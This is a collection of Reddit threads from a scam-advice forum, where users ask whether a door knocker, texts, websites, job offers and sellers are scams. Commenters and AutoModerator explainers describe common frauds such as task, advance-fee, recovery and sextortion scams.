- I often check through the blinds to see who is there. If they look suspicious I don‚Äôt bother opening the door. Don‚Äôt care if they see me. Or, if I do open I immediately ask for their (city required) permit. Most don‚Äôt have one or claim it‚Äôs in the car. At this point I threaten to call the police. 

I‚Äôve also gotten calls asking me if I‚Äôm interested in selling my house ‚Äúif I sell it where will I live? Can I move in with you??‚Äù Right before hanging up and blocking the number.
- That‚Äôs so strange! ü§î 

It‚Äôs definitely a red flag when someone keeps changing their story like that. They could just be curious, but it‚Äôs also possible they‚Äôre up to something shady. Always trust your instincts‚Äînext time, maybe just respond through the doorbell camera and let them know you‚Äôre not interested. 

Better safe than sorry!
- The guy is just wanting to make money by buying and selling your house, or subleasing your rental to someone else.
- I just tell them that is personal questions and none of their business
- Could be cold calls looking for houses to flip. Any excuse to start a conversation. Renters don't sell. He is looking for home owners.
- Maybe casing your house with a view to burglary..?
- I know someone in Saratoga, NY who has a cute, charming house.  During the horse races in August, people from the NYC area are asking if she wants to sell her house.
- I live across from a new development area, and surrounding property has been going up in price lately. We have been approached in person and with flyers offering house appraisals and if we are interested in selling. It is just real estate agents canvassing to try and get some commissions while the housing prices are high.

I‚Äôd say it is likely not a scam, but would be cautious about it just in case they are using pretending to be a real estate agent to scope out your house as others have said
- Be careful it can be part of a scam. The person comes to your home and asks a question trying to see how many people etc in the house. They id the occupants track them and then rob your house. It‚Äôs also people making large sums of illegal money that need a legit shelter. They buy a llc get the house and your evicted. I lost my home this way and never got justice. There‚Äôs way more to it but it‚Äôs the short version. I do not ever answer door knocks unless someone is scheduled to show up at my door. I don‚Äôt talk to strangers about my home situation either.
- That‚Äôs so odd! üò≥ 

It‚Äôs definitely suspicious for someone to knock and ask those kinds of questions out of nowhere. I‚Äôd be cautious, especially since his story didn‚Äôt add up. 

Using the doorbell camera to respond next time sounds like a safer idea. You never know what someone‚Äôs real intentions are these days.
- This dude is a thief.
- he was casing your house and rang the bell to see if anyone was home.  As you were, he made stuff up hoping you wouldn't take his picture and call  the cops.
- I had someone come to my door, knock on it, ask to buy my not-for-sale truck.  They were casing, determining if anyone was home.  Came back when no one was home, took a safe (whole) and a range bag with a nice 22.
- You should tell your husband to never answer questions to someone at his door. Dang man
- looking to squat or rob u
- I received calls weekly asking me to sell my house.  So many that I just don‚Äôt answer unless in Contact list or I‚Äôm expecting a non contact call.
- Did they look like a salesperson? Not saying it isn‚Äôt scammy, but it could be slightly more innocuous; I‚Äôll have tradespeople show up (roofers, plow companies, landscapers, etc..) and a sure fire way to get rid of them is to say that you rent and you‚Äôre not responsible for XYZ‚Ä¶
- They are selling some shit like roof repair or solar and they don‚Äôt want to waste their time talking to a renter.
- The reason that they do this is to case the house for later breaking and entering. They want information: how many people, how old, dogs, expensive things or not, how many cars, cameras and position of cameras, etc.
- We have a long driveway and a lot of frontage, so some parts rarely get seen. One day someone asked us this question and it turned out a realtor had placed his sign on our property trying to apparently direct people to a place 2 miles down the road, but failed to have reasonable signage.
- Don't talk to door knockers, end conversations sooner.   "No", shut the door if you make the mistake of opening the door when complete strangers ring your door bell.
- They came to rob your house, first check if anyone home before they break in?, you are lucky to be at home
- Could be squatters looking for a place to break into.
- Probably a new realtor trying to find business
- Of course everyone thinks he is casing your house... Investors are always leaving notes on my door or in my mailbox looking to buy my house.  Occasionally one will show up at my door, asking if I'm looking to sell or know anyone else in the neighborhood looking to sell. 99%, it was probably an investor or someone getting paid by an investor to find leads.
- You're posting in the scams subreddit. Seems like you already know the answer to this question..like, what's the question?
- I agree! My husband was the one who answered the door and talked to this man. I saw it via the doorbell camera and quickly texted my husband to stop interacting but ofc he was not checking his phone.
- Who even answers the door?
- "Fuck Off" also works.
- Well if it's Jehovah witness from Mormons I will answer naked to get rid of them faster ..
- People born before 2000.¬† It is super weird to not answer your door.
- Right? Like hell no. I don‚Äôt even answer when I know it‚Äôs DoorDash. I wait until they drop the food in front of the door and patiently wait until they‚Äôve driven away. If someone knocks and I‚Äôm not expecting someone specific I hide looking out the window from behind the curtain lol
- A lot of communities also have real estate guides you can get from places like grocery stores and libraries and/or include real estate listings in the newspaper (to say nothing about classified ads).  Between websites and paper guides, there‚Äôs no reason to go around asking random people.
- Elderly? Could be just a Real Estate Agent looking for business. They just look for a house likely owned by an older person who doesn't know the present value. "I'll offer you &100,000." "Wow, I only paid $42000. what a good deal!"
- It's just an investor looking for properties.
- this. im shocked so many people in these comments have never heard of real estate canvassing its VERY common if you live in an upper middle class residential area.
- Its 00buck for the win not slugs
- Yes, I was in between houses and looking for a place to rent for a few months,  but not pay the rates of corporate housing, and this was before Airbnb 

I found an ad, supposedly from an out of state owner,  looking to make a few bucks while finding a buyer.  We had an interview over the phone,  sounded like the sweetest old man,  and everything seemed to check out. 

I decided to drive by the house to see if it would work,  and while I was on the property, people pulled up.   I explained that I was talking to the owner about renting the place,  and they looked so confused,  until they said they were the owners.

That's when I realized it was a scam,  and I showed them the text messages of the fraudulent owners, and gave them the phone number as well. They said they would file a police report,  and I provided my info as well,  if the police wanted to talk to me. 

From there I decided to prevent the scammer from targeting anyone else, so I strung him along, negotiated the rent price down,  asked him to confirm he was the owner,  then questioned why his first name didn't match county records,  and accepted his answer of a nickname. 

I told him the check was in the mail,  then when it didn't arrive,  asked him to deduct for stop payment fee and FedEx charges for the second check,  and even provided him a bogus tracking number. 

After the package didn't arrive and he started getting aggravated, I laughed and asked him how it felt to be scammed.
- This.
- this is the correct answer. not sure why ur downvoted
- This could be anything. But most problematic would be checking to see if someone is home mid day (if the house doesn‚Äôt immediately appear so- cars in the driveway etc) to attempt to rob you. There‚Äôs also house buying scams that target elderly people to try to buy homes below market to flip. Who knows- it doesn‚Äôt really matter. 

I don‚Äôt know why people aren‚Äôt more proactive about ignoring things like this or approaching them with appropriate levels of caution. Why do you even have a doorbell camera if husband is going to answer the door to any random approach? 

You and husband shouldn‚Äôt be answering the door to random people- even if he doesn‚Äôt think they are an immediate threat. Dude was uninvited. There was no reason to speak with him about anything. Him being sketchy with his reasons and inquires even more so. Next time don‚Äôt answer, or only answer through the doorbell camera and simply tell them to get off your property.
- lol.  Hopefully it was nothing like burglars casing homes.
- I am a realtor and a real estate lawyer. There is no reason for this whatsoever. Don't answer the door for people you weren't expecting, the video doorbell is the greatest invention of our age.
- It‚Äôs probably just people that go around and try to buy up houses. They‚Äôre kind of scammy. Like they‚Äôll talk to people and say they have cash to buy the house. They‚Äôll give a quote that seems like a great deal, but then the actual offer will be much lower. They sometimes try to tack on a bunch of fees to the deal so that you end up with even less money in the end. 

The other possibility is they‚Äôre a solar panel salesmen. They usually ask if you rent since they don‚Äôt want to waste their time pitching to you if you don‚Äôt have the authority or motivation to get solar.
- I'd have gotten on the speaker and yelled at the guy to go away.
- Best thing to do is take your phone out and start recording the interaction, that usually makes them leave right away.
- Can you post pics of the person?
- "We make a donation to the Satanic Temple every time a church recruiter rings our doorbell."
- My bathroom is just next to the front door. I just open the window and flush
- Seriously? I live in a big city and no one I know answers the door if we aren't expecting anyone.
- For your own safety from this day forward . Do not answer your door . You can talk to them without answering. You can tell them you would be happy to make a call for them . There are way too many scam s . And people who canvass neighborhoods for later .
- When my sister had her first baby, one of the most interesting things I learned was that DoorDash drivers leave faster when you mention in the order notes that there‚Äôs a sleeping infant and ask them not to knock.
- I can't think of a reputable agent who would do this.
- Agents know how to pull comps for pricing.
- Yeah, I think this sub is a little to eager to jump to "criminals casing the place for a robbery". Real estate people do this **all the time**, especially like you said if the homeowners are elderly. They're looking for people to lowball.
- Depends on what one wants to see...
- I saw this happen on a news report! They basically pretend to work in the persons interest and then basically get them to sign a bunch of stuff over to the scammer!
- I don‚Äôt know about OP and their husband, but my brother in law and sister have doorbell cameras  because my sister is the one who wanted them. As far as my BIL is concerned, nobody is a stranger. He‚Äôs like a human golden retriever. He sees the ‚Äúsomeone is at your front door‚Äù alert as a sign to get up and go over to the front door instead of just answering from the phone.
- [removed]
- I think this is it, unfortunately.  OP and family should have motion-activated lights in addition to their cams and leave on some other lights (foyer, & at least one more room) and maybe the radio whether home or not.  Dog bowl on the porch.

There are definitely rental scams, but the stranger's odd list of questions suggest more than that.  "How much do these houses cost?" is really weird.  Zillow has all of that info; there's also a general sense of how much houses are costing in cities.
- It was someone casing their home.
- Absolutely this or people looking for elderly people to scam later.
- This is also the reason why I couldn‚Äôt ever go door knocking as a realtor. Had the cops called on me a few times for being suspicious, despite having a pocket copy of my license and other supporting documents. Was banned from door knocking in my own neighborhood! People are so paranoid, and I get it. But I‚Äôm also not a realtor anymore. Too expensive to keep it up, plus everyone in this area parroting ‚ÄúI don‚Äôt need a realtor, shut up, I can just list it myself online.‚Äù
- You‚Äôre awesome
- lol
- lol
- Lmfao what?? Absolute crazy response
- I get regular solicitations to buy my house, which is not for sale. I am in a desirable neighborhood in California, though.
- I think that's the point, they wouldn't exactly fall into the "reputable agent" category.
- isn't this arguably worse? Like if they steal Grandma's fine china worth $1000 vs lowballing their house by $50k. At least the china can be recovered from a pawnshop. Buying a house for far below market value should be considered fraud
- Eh, I think drawing a distinction between burglars & con-artist estate agents is academic - they're both ne'er-do-wells looking to rip you off!
- All this is verifiable through a mls search (for realtors) or redfin or zillow or public records for buyers or any nosy types.  This person was none of those things and very dumb.

That is a big red flag to me and is definitely something i would want my neighbors and the cops to be aware of.

- Dog bowl: good idea, thanks.
- Unfortunately, that's the most likely reason.
- Jehovah Witnesses need to get that message.
- It‚Äôs worse now post the court case of last year. The business is a mess and while there are certainly useless agents, having one can save a ton of pain and misery. Same with lawyers, but did NOT come here to debate either business. Door to door is rough. Did it for charity for one day and never went back. Affronted my do-unto-others sensibilities. I certainly do not wish to be bothered at home.
- Nope, that's now common advice.

Look, I haven't had a positive interaction with a stranger who knocked on my door and I'm closer to my death than my birth.

I have had a whole bunch of solicitors waste my time and theirs. 

I have read stories of any number of home invasions and burglaries that started with or were contributed to by residents opening their doors.

I have read of quite a few scams that begin with people answering the door.

No upside. Some downside. 

That's a bad gamble. I don't take it.
- Less than 3 percent of all stolen goods is recovered even in our age.
- Not really? The people trying to low ball you are scummy and potentially doing something illegal but they're not looking to break into your house and rob you. I'd definitely consider a scam artist less bad than someone looking to violently enter my home.
- Scammers only have as much access to your money as you give them. A home invader is going to take what they want from you whether you give consent or not.
- >All this is verifiable through a mls search (for realtors) or redfin or zillow or public records for buyers or any nosy types. This person was none of those things and very dumb.

Asking about the price is a conversation starter, they don't care about the actual dollar value. They're gauging what the person *thinks* their house is worth and whether or not they'll be vulnerable to a low offer. 

>That is a big red flag to me and is definitely something i would want my neighbors and the cops to be aware of.

Neighbors I'm right there with you, I'm sure they'll be trying to trick them into accepting a low offer too. YMMV with even getting a response if you bring this to the cops.
- And, if you're female and live alone, get a second-hand pair of mens work boots to leave on your porch as well.
- With some large bones scattered around and something like a skull wearing a postman's cap...
- "Come, all you who are thirsty... " Isaiah 55:1

I'm concerned the local wildlife would come over for a drink. An empty water bowl would look too much like a prop, and skunks, raccoons, and coyotes might be attracted to one with water.

A few tears ago, a couple of skunks would hang out on my driveway every evening around 9. I think a potential burglar might visit some other house instead of mine.
- If people started calling the cops on them they would?

 Sometimes it doesn't even take that much to stop them

There's the very simple, "please don't come here again"

To the very elaborate and complicated, like answering the door shirtless covered in costume blood shouting "what the fuck do you want I'm sacrificing a goat in here"

Jehovah witnesses are fairly easy to get rid of if you've actually tried
- Not sure where you‚Äôre hearing this advice from. Never heard it, other than people typing behind a keyboard that don‚Äôt interact with the world. Answer your door.
- Sounds like you have it all figured out.  Is the real estate in your area buckling or something?  I don't even see "we buy foreclosures" signs and  banners along the side of the road where i live.  Folks like this strolling a private neighvorhood asking about home values is super suspicious to me.
- Thanks for another good idea.
- I don‚Äôt answer, I can see them getting out of their cars on my street and they‚Äôre in their Sunday best clothes on a weekday. The other annoying/aggressive  people to avoid are the ones trying to get you to switch your power and electric service. They are dressed in fake utility vests and carry a clipboard.
- What is the upside to answering my door?
- Its a predatory real estate practice that's a massive issue across the country. Its common enough that organizations like the AARP send out mailers nationwide specifically warning elderly people to avoid agreeing to anything when realtors come by asking about home prices.
- Finding out what the person at your door wants?
- Yeah but does their presence represent weakness in the (local) real estate market?  I am not seeing any indications this is the case because real estate seems pretty robust where i live.  These guys wouldn't get the time of day given the availability of inventory
- I don't care. If they stay on the outside, I'm happy regardless of their desires.
- I dunno.

I've gotten solicitations to sell my house/s once every other or third day for the entire duration I've had them (my earliest is 2008).

FWIW, it's never ever been in-person, but it's through mailers, text, and phone calls.

So, I wouldn't suspect it's indicative of a poor market. Just of predatory practices across the board.
- It is kind of a hard pill to swallow that these buyers would have any luck buying distressed homes when the sellers could just list their houses with a realtor and get close to full asking price instead of getting lowballed by these predatory buyers.

More likely a few unsophisticated thieves casing a neighborhood to rob the low hanging fruit.

Title: What are these texts?
Body: I have gotten these strange texts from apparently bot tiktok accounts, the messagges look AI generated and they always offer me money in exchange for texting them ($500-$1000), they say they wanna get to know me and ask me about my personal info (country, age, etc) and call me by my name (Suzy, but my display name is siouxzie so idk if its actually AI/some kind of bot or a person), they always ask about what i do for a living even though im clearly underage so i can't work, and also give me weird compliments like "you have sexy eyeballs" ??? I usually reply with fake info or dumb things like saying im a snake milker or that i sell organs on the deep web, but they never have a reaction to my weird answers, they like every message i send and always use emojis and stickers, very bot looking imo but i still dont understand what's the point of these üò≠üò≠

You should stop replying. That only tells them the number is active. Also, that's how snake poison is harvested to make antidotes. Sort of.

- Hi /u/AngelOfLight, AutoModerator has been summoned to explain the Sugar daddy or momma scam.

Sugar dad/daddy/mom/momma scams are [very common](https://www.fraud.org/sugarbaby_alert) and usually come in two varieties: fake check style scams, and advance-fee scams. Fake check style scams involve the scammer making a fraudulent payment to you that will later be reversed, and then you making some sort of payment to the scammer that will not be reversed. Common examples include the scammer sending you a fake check and asking you to buy gift cards, or to send money via Western Union, or to purchase Bitcoins. Another common example involves the sugar scammer offering to pay your bills, or offering you banking information that you will use to pay off your bills. These bank accounts are stolen and the innocent victim will reverse the charge when they notice the fraud.

The second variety of sugar scammers use advance-fee scams, where they offer you money but require you to pay first. They may ask for you to pay them to prove that you are loyal, or they may require you to pay a processing fee. It's common for sugar scammers to send spoofed emails that look like they came from services like PayPal or CashApp that will inform you that you have received money, but that also ask for a processing fee before the funds are released.

In the real world, sugar babies are sex workers that engage in in-person sexual encounters with their clients. **We do not recommend that people try to be a sugar baby, but if this is what you are looking into, check out the following subreddits for information on how to be safe: r/SugarLifestyleForum/ and /r/SexWorkers**.

I have been charged ‚Ç¨50.99 without my consent and they refuse to acknowledge that they have made a mistake. The customer service is terrible and the help is only through a chatboot. Unbelievable how they can profit without respecting the customer's wishes to cancel the subscription immediately.

Title: Assisted-uk.com a scam?
Body: Hello! I need help to convince my friend that this is a scam. She messaged me asking for $1000 to pay this app so she can withdraw her funds. I told her that this is a scam, do not send them any more money. I'm not sure if she really believed me. She sounds upset and desperate, because she put in "all the money [I have]", which is $3k. I tried to check "is this website a scam" websites but for some reason it's saying it's legit.

I'm worried that she might still try and get her money, I explained the pig butchering scam to her, but has anyone else encountered this?

- Never pay to get paid! This website is only 3 months old and registered out of Cambodia.

This is a !task scam. She should block them immediately.

- Search "task" in this sub. 

Explain to her that her money is lost and she has a choice to only lose $3k or to lose $4k. Those are her only options, she's never going to see the money she put in.
- I'd say: If they needed you to pay a fee to get your money, why wouldn't they just take it out of your balance?
- You don't have to pay your job to get paid. It's the opposite of what a job is.
- Show this post to your friend, with all the comments.

I am going to guess that she did some online tasks, like reviewing videos or hotels. And that she got paid the first day, but then they told her she needed to "invest" money to get more or better tasks. And that they are now telling her she has to pay taxes, or transfer fees, or some other bullshit fee, to get her pay released. If this is what happened, it is a very common task job scam. I am guessing that all transactions were done using cryptocurrency. 

Nobody really pays you for clicking a screen, no matter what they call it. **This is not a job, its a scam to take your money.** The platform is fake, the tasks are fake, the people are all lying to you. The name of the "company" doesn't really matter, because there are hundreds of these phony jobs using different company names. But the scams all follow the same pattern:  You will be required to pay a fee to continue working or to withdraw your money. Then another fee, and another. Then they disappear with your money.

**I want to emphasize this:  whatever she gave them is gone, she will never get it back. Whatever they show on the screen as commission is lies, it's made-up numbers to fool her into putting more money in. If you loan her money, she will give that to the scammers and you will never get it back.**
- Looks like !task

Three months old and everything in WHOIS "redacted for privacy"

- Hi /u/Applauce, AutoModerator has been summoned to explain the Task scam.

Task scams involve a website or mobile app that claims you can earn money by completing easy tasks, such as watching a video, liking a post, or creating an order. A very common characteristic (but not entirely exclusive) is that you have to complete sets of 40 tasks. The app will tell you that you can earn money for each task, but the catch is that you can only do a limited number of tasks without upgrading your account. To upgrade your accounts, the scammers will require you to pay a fee. This makes it a variant of the advance fee scam.

The goal of this scam is to get people to download the app for easy money and then encourage them to pay to get to the next level. It's impossible to get your \"earnings\" out of the app, so victims will have wasted their time and money. This type of scam preys on the [sunk cost fallacy](https://en.wikipedia.org/wiki/Sunk_cost#Fallacy_effect), because people demonstrate a greater tendency to continue an endeavor once an investment has been made, and refusing to succumb to what may be described as cutting one's losses.

If you're involved in a task scam, cut your losses. Beware of recovery scammers suggesting you should hire a hacker that can help you retrieve the money you already invested. They can't, it's a trick to make you lose more money. Thanks to redditor vignoniana for this script.

- That's the truth. She's just operating under the sunk cost fallacy and thinks she can still get back what she put in. It sucks, but that's why scams like this work.
- Nice job, if you can get it! On the other side of this scam, that is.

This domain name was first registered only 3 months ago (Oct 2024) and it was only registered for a single year (Expires: Oct 2025). 

It was registered at "Gname.com Pte. Ltd.", a sketchy registrar based in Singapore and the person/organization who registered this domain claims to be based in Cambodia. It is also concerning that they are hiding the rest of their contact info on Whois AND they are using a "DNS proxy" (CloudFlare) which masks where the website's server actually is.

- !advancefee scam. They'll keep telling you about fees/taxes and whatever until you stop and realize it's a scam.

You as the seller/provider should set the terms of what payment types you accept, and you should do some research on whatever you decide to accept to ensure you know exactly how it works to avoid situations like this.
- Clients pay you in exchange for goods or services. *You do not pay clients.* You've screwed up a very, very simple process. You've been scammed. Your "client" is fake.
- Yes it's a scam. They're trying to milk you out of money as much as they can with the fake fees. Please do not pay to get paid.

Block them and watch out for anyone that DMs you claiming they can help get your money back. They can't help.
- Watch out for !recovery scammers
- You are being scammed. Total BS fees. Cut contact and cut your losses.
- Of course it's a scam. Why does the client get to dictate how you get paid, and why does the client get to ask you to pay fees? It's a scam. This isn't a client. It's a scammer. You'll never get paid. Every penny you put in goes into the scammer's pocket, and gives them even more reason to keep scamming you, and more resources to use scamming others. You're fueling the scam industry.
- What industry are you in that payment in Bitcoin is normal?
- Hi /u/1Cattywampus1, AutoModerator has been summoned to explain the Advance fee scam.

The [advance-fee scam](https://en.wikipedia.org/wiki/Advance-fee_scam) arises from many different situations: investment opportunities, money transfers, job scams, online purchases of any type and any legality, etc., but the bottom line is always the same, you're expected to pay money to receive money. So you will pay the scammer and receive nothing.

It can be as simple as the scammer asking you to pay them upfront for an item they have listed, or as complex as a drug scam that involves an initial scam site, a scam shipping site, and fake government agents. Sometimes the scammers will simply take your first payment and dissappear, but sometimes they will take your initial payment and then make excuses that lead to you making additional payments.

If you are involved in an advance-fee scam, you should attempt to dispute/chargeback any payments sent to the scammer, you should block the scammer, and you should ignore them if they attempt to contact you again. Thanks to redditor AceyAceyAcey for this script.

- Hi /u/onlymodestdreams, AutoModerator has been summoned to explain the Recovery scam.

[Recovery scams](https://www.consumer.ftc.gov/articles/0102-refund-and-recovery-scams) target people who have already fallen for a scam. The scammer may contact you, or may advertise their services online. They will usually either offer to help you recover your funds, or will tell you that your funds have already been recovered and they will help you access them. In cases where they say they will help you recover your funds, they usually call themselves either \"recovery agents\" or hackers.

When they tell you that your funds have already been recovered, they may impersonate a law enforcement, a government official, a lawyer, or anyone else along those lines. Recovery scams are simply [advance-fee](https://en.wikipedia.org/wiki/Advance-fee_scam) scams that are specifically targeted at scam victims. When a victim pays a recovery scammer, the scammer will keep stringing them along while asking for increasingly absurd fees/expenses/deposits/insurance/whatever until the victim stops paying.

If you have been scammed in the past, make sure you are aware of recovery scams so that you are not scammed a second time. If you are currently engaging with a recovery scammer, you should block them and be very wary of random contact for some time. It's normal for posters on this subreddit to be contacted by recovery scammers after posting, and they often ask you to delete your post so that you both cannot receive legitimate advice, and cannot be targeted by other recovery scammers.

Remember: never take advice in private. If someone reaches you in private after posting your scam story, it is because a scammer will always try to hide from the oversight of our community members. A legitimate community member will offer advice in the open, for everyone to see. Anyone suggesting you should reach out to a hacker is scamming you.

Title: I think justanswers is taking revenge against me.

I contacted them for a refund and they wouldn‚Äôt give it to me until I threatened to report them to the FTC and dispute the charge with my bank. Now my email that I used to sign up for the account is receive an insane amount of spam mail from various places about selling my property , inquiries about apartment complexes, newsletters, and even sex toy websitesabout 10-20 minutes after I ended the chat.

- Just answers isn't doing anything. They are a "legitimate" service that just relies on you not reading the terms. They aren't risking the money they make to get revenge on someone for an FTC complaint that won't do anything.

When you get a bunch of emails like that at once it means a scammer tried to do something like change the password on an account, and hide it by bombarding you with spam at the same time. You need to check through all those emails around the day they started and make sure there isn't an actual notification.
- part of the "service" justanswers provides is to collect your information and pass it on to vendors, who can then bombard you with advertisements related to your questions ¬†https://www.justanswer.com/info/privacy-security

as big of a hassle as it is, it's worthwhile to skim the privacy policy and terms of service before you register an account on any platform
- I looked through it thoroughly and don‚Äôt see any password change requests or anything like that. You don‚Äôt think the chat support agent wouldn‚Äôt be trying to get back at me? I was pretty rude to them to be honest haha.
- i was just freaking out cause my cat was sick and i was trying to text the free chewy vet idk man
- that‚Äôs true, thank you
- That usually means they signed you up for the mail in preparation to try your password, but the password they had was from a dump that was out of date or you didn't have an account they thought they did so you never got the notification.

I won't say its impossible a chat agent had access to your email address, and got angry enough to spend their own money putting you on a mail bomb list, but I think its way less likely than the alternative which is a known tactic we've seen here hundreds of times.
- Its possible, they are human. If you treat someone badly, some want revenge
- I hope your cat will be ok - much cat love to you and yours.  Take care and good luck.
- yeah that‚Äôs honestly what i‚Äôm thinking, probably just butt hurt or something idk
- Thank you! He is doing much better now and back to his crazy self!
- Maybe restart the chat, apologize for your rude behavior, and see if the spam emails stop? You know, for science

Title: Q16 Pro Headset received Unsolicited
Body: Hi,

  
Today in the mail, I received a set of Q16  Pro Over the ear the headsets.   The place that sent them to me (on the return address) was located in New York. I do not remember ordering them and I dont see any charges on my CC for this device.

I am concerned that this might be related to some type of scam and am afraid that once connected to my device, my information will be compromised.  It looks like they are sold on TEMU but I have never bought anything from TEMU.  I am looking for advise on how to proceed.

I have searched Google, and this platform, to no avail.  I also have checked Amazon just to make sure that I did not ordered this by mistake.

There are reviews on the headsets, and according to the reviews, they are pretty decent headsets.  

The model number on the box is YYK-Q16 Pro.  I have attached a picture of the box

- It's a super common !escort scam. Block and ignore. The escort was fake, the site you found them on was fake, everything is fake. They will use your number as a way to find info on you online (it's ALL online now if you search your number!) but they just use it to make fake threats to scare you. You're FINE.

But stop looking online for sex/hookups - they're pretty much all scams at this point. Don't do stuff online with strangers that would embarrass you/cost you money.
- Tony?

It's a very common scam, and the scammers are not affiliated with cartels or crime groups, they are simply normal scammers using a threatening script.

Title: HMG Careers/SKW/AIL - false employment?
Body: I have seen a few different posts about this company here but none of these are super recent and wanted advice as I have been chosen/interviewed for the Benefit Advisor position and have already paid for the HLLQP course, and want to stop before I go any farther if it is indeed a scam.  
I am now concerned that if I give them my SIN for my paychecks, they'll do something nefarious with it considering all the bad feedback. Good reviews I have seen so far seem "professional" and super positive, but also some negative comments seem really misinformed/dramatic (for example, misdescribing parts of the hiring process or accusing the companies that you get you life insurance license from of being scammers as well)  
I just don't know what to think, they're admittedly painting a very perfect picture of employment, work from home and choose your own schedule to a reasonable degree, get paid for how much you work on a commission basis, bonuses, renewals, etc. They make it sound like anyone could easily fetch 1500+ a week if working regular hours.

- Is it a remote job? If it is it's probably a scam. You had to pay for a training course? That doesn't sound right either. Was the interview in person or via teams or WhatsApp? Probably could help more but would need more info...co name, website, etc.
- https://www.reddit.com/r/Scams/comments/1dn1fa9/have_anyone_applied_to_hmg_careers/

>I have seen a few different posts about this company here but none of these are super recent 

Are you hoping they somehow changed and became legit?
- Yes remote. I have to pay for my license, not training. They would be training me after I got my license. They just wont pay for my license 
All virtual, I was in a call with lots of other "hirees" the supervisors were asking a few questions then they explained the job some more.
Company is HMG Careers, they hire for SKW AND AIL insurance groups
This is their website:
https://www.careers-page.com/hmg
- I suppose, the earliest I can find is from three months ago and all the comments say different things, like its all 100% scam, no its just a shitty job, its great, its good but you take advantage of people, lots of different takes
- That sounds like an MLM, which is essentially a scam.  They'll take your money every month for training and advice, but you won't be able to make it back
- 2378 open positions, all remote? All the same job?

SKW Insurance is a woman-owned small business.¬†Kay Winkler¬†is an independent insurance broker based in the Raleigh, Durham, Chapel Hill area of North Carolina

AIL insurance has their own website for hiring ail careers dot com

Did you pay them for the license or paid directly to an organization?

Also, interview with lots of other hirers and not 1 on 1 sounds sus.
- I do wanna say I agree its super sketchy, but how exactly does it do thoss things?
I said they train you free of charge, actually theres a training bonus so they said, and you dont pay for leads or literally anything else
The only thing I'm responsible for is the LLQP course and exam and the license, they don't pay to cover that for us. But that's through the government, the money doesnt go to them. I pay the treasury of my province for those things. Unless you mean to say, they trick you and you do actually end up paying for things they said you didn't have to
- AIL is lying scum.
- I would have paid the treasury of my province for the license, its kind of a similar process as getting your drivers. Thankfully HMG Careers had nothing to do with me getting my license other than requiring me to get it, and helping guide me for how to get it. REMIC is the company I paid for the course- Ive asked if they can refund me - but they're legit afaik and dont just hand the "stolen" funds over to HMG or anything.

Yeahhh I just got really excited and hopeful that maybe I could start building an enjoyable/worthy life that I guess I didn't stop to think about the little things :/ (I have no experience with officially, professional interviews so)
- How did this job get presented to you? (Did they reach out to you?  This is a scam)
What is this license youre getting trained for?  Is it just a company specific license? (That's a scam)
Do you think the other chatters in that chat room were people?  They were bots. (That's a scam)
How much insurance do you expect to sell to people from a shady company you can't even find information on?  Would you buy insurance from you?
- 1. I applied to them on linkedin
2. The license to sell life insurance is not tied to any job. I could take it and use it in any insurance job I could find. Literally like how with a drivers license and being able to use it to drive ANY car, not just the car you got your drivers for
3. Everyone had their cameras on and were acting/interacting/talking like real people, we all took turns answering the supervisors questions. We used Zoom Workplace  not a chat room 
4. Im not sure what this means. HMG is the hiring company, they place hirees in different insurance-selling companies like SWK and American Insurance, which work with unions/veterans to sell insurance products. Thats how they explained it. Im desperate. I would sell insurance to people regardless of whether I would buy from myself or not, maybe it makes me a bad person but I'd never choose feeling good about my morality over a paycheck
- Then it passes a few of the main red flags, but it feels iffy.  I really don't know.  Good luck.
- By "passes" you mean does NOT show typical scam behaviour? Yeah, its all just kind of weird....thank you! I mighy just play it safe

Title: Extortion and doxxing
Body: A Reddit user contacted me pretending to be a woman interested in the same fetish as me and wanting to setup a meeting. 

Once we hashed out the details and got my personal info, they asked for gift cards worth $1000. 

After I refused he created posts on FB in my local communities trying to expose me(my fetish and to my wife)

I tried to report this to Reddit but it just redirects me to some help articles. 

What do I do now?

- You report the account on the platform (reddit), block and ignore and keep doing so. 

It is a variety of a !sextortion scam. In future, should be more cautious about doing things online with strangers that could embarrass you or be used against you if you value your money/reputation/relationship.
- Hi /u/1Cattywampus1, AutoModerator has been summoned to explain the Sextortion scam.

This scam occurs when you meet a woman/man on dating service/social media site/forum/wherever and they ask you to go on Skype, WhatsApp, Telegram, or another messaging system. They will ask you to exchange naked pictures, and they will usually ask you to include your face in the pictures. They will then threaten to reveal the pictures to your family/friends if you do not pay them. The best thing to do in this situation is block the scammer and go private in your socials for a while. Paying the scammer will not make them back off, and just tells them that it is worth their time to continue threatening you.

If you fell for this scam, we recommend you join the sextortion subreddit and follow the recommendations of their sticky post: https://www.reddit.com/r/Sextortion/comments/n4yorq/new_victims_please_read_first/

Also beware of recovery scammers suggesting you should hire a hacker that can help you retrieve the photos or get back at the extorter. They can't, it's a trick to make you lose more money.

Title: Trying to buy an expensive bed/mattress( made 12/2008) for 200$.
Body: The bed our day is discontinued and usually it costs few grands. 
This is the discussion I had with the seller Ok, I can show you pics of it, it's disassembled. It's at my office, I'm not there tomorrow but I can send you pics on Thursday of all of the pieces.

WED 17:41
Hi again. Just curious. Why are you selling it? Thanks
Don't have a need for it anymore, it's just sitting in storage.
WED 21:41
Understand. But what I don't, is that you said it's at your office
That's where I store it.

- Impossible to tell if it is a scam or not without more context and information. As general rules when buying an item from someone you don't know (e.g. Facebook marketplace), meet in person, at a public place. If you sell, ask for payment in cash. If it is a big amount, you can make the transaction at a bank with the buyer so the bank employee can confirm that the money is not fake. Also, if possible (depending on the item), check it and test it before the transaction. Here, considering you are buying a big item: bed/mattress, it might be complicated to organize a meeting at a public place.
- None of this tells us it's a scam (aside from the low price which might be a red flag.)

The question you need to ask is "When and where can I pick it up and pay cash?"
- Are you selling a 16 year old bed for $200? Or trying to buy a 16 year old bed for $200?
- We can't even read this post well enough to know what you're talking about. I now feel scammed.
- There's not enough context to say it's a scam.  Sometimes people don't have room to store unused furniture in their home. Sounds like the seller has extra space at their office.

Why don't you ask if you can meet him at his office to pick up the bed if everything looks ok?
- This isn‚Äôt necessarily a scam and honestly the price isn‚Äôt even a red flag to me. People these days are terrified to buy used mattresses at all because of the potential of bedbugs so an aggressive price makes perfect sense, but especially considering this thing is almost 20 years old already
- Either way it‚Äôs 16 years old !
- Trying to buy a 16 yo bed
- Yeah I wouldn't say a 16 year old bed for $200 is a "too good to be true" deal lol
- Maybe a really cool bed frame, but a 16 year old mattress is a goddamned biohazard lmao

Title: Constant PayPal Credit Texts (I‚Äôve never had PayPal credit)
Body: So basically for almost a year now I‚Äôve been getting texts saying
